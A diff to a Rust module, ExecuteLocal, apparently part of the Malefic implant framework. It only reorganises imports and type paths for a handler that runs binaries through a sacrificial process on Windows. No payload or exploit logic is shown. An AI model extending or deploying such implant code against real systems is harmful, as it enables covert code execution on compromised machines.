@@ -1,14 +1,10 @@
-use crate::{Module, TaskResult, check_request};
+use std::ptr::null_mut;
+
 use malefic_helper::common::utils::format_cmdline;
 use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_helper::win::kit::pe::run_sacrifice;
-
-use std::ptr::null_mut;
-use async_trait::async_trait;
 use malefic_helper::common::filesys::get_binary;
-use malefic_helper::to_error;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 pub struct ExecuteLocal {}
 
@@ -17,9 +13,9 @@ pub struct ExecuteLocal {}
 impl Module for ExecuteLocal {}
 
 #[async_trait]
-impl crate::ModuleImpl for ExecuteLocal {
+impl malefic_proto::module::ModuleImpl for ExecuteLocal {
     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> crate::Result {
+    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> malefic_proto::module::ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
 
         let mut exec_response = BinaryResponse::default();
